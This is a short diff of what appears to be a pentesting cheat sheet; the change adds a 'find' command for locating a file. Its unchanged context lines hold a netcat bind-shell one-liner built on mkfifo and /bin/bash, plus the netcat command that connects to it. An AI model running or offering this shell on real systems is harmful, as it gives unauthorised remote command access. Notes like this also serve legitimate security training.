@@ -48,3 +48,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash i 2>&1|nc -lvp 1234 >/tmp/f
 ```shell
 nc 10.10.10.10 1234
 ```
+Find:
+```shell
+find / -name "valami.txt" 2>/dev/null
+```
